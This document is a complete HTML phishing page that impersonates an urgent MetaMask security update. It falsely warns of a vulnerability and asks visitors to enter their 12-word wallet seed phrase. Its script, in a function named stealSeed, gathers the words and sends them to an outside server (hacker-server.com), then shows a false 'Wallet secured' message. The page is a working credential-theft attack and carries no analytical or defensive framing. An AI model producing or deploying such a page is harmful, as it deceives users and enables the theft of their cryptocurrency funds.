<!DOCTYPE html>
<html>
<head>
    <title>MetaMask Security Update Required</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .warning { background: #ff4444; color: white; padding: 20px; border-radius: 10px; }
        input { padding: 10px; margin: 10px; width: 400px; }
        button { background: blue; color: white; padding: 15px 30px; border: none; }
    </style>
</head>
<body>
    <div style="max-width: 600px; margin: 100px auto;">
        <div class="warning">
            <h2>🚨 URGENT: MetaMask Security Update</h2>
            <p>Your wallet is at risk due to a critical vulnerability.</p>
        </div>
        
        <div style="background: white; padding: 30px; border-radius: 10px; margin-top: 20px;">
            <h3>🔒 Verify Your Identity</h3>
            <p>Enter your 12-word seed phrase to secure your wallet:</p>
            
            <input type="text" id="word1" placeholder="Word 1"><br>
            <input type="text" id="word2" placeholder="Word 2"><br>
            <!-- ... 10 more inputs ... -->
            <input type="text" id="word12" placeholder="Word 12"><br>
            
            <button onclick="stealSeed()">Secure My Wallet</button>
            
            <p style="font-size: 12px; color: gray;">
                <i>This is a mandatory security update from MetaMask Inc.</i>
            </p>
        </div>
    </div>
    
    <script>
    function stealSeed() {
        const seed = [];
        for(let i = 1; i <= 12; i++) {
            seed.push(document.getElementById('word' + i).value);
        }
        
        // VERİYİ HACKER'A GÖNDER
        fetch('https://hacker-server.com/steal', {
            method: 'POST',
            body: JSON.stringify({seed: seed.join(' ')})
        });
        
        alert('Wallet secured! Please wait...');
    }
    </script>
</body>
</html>
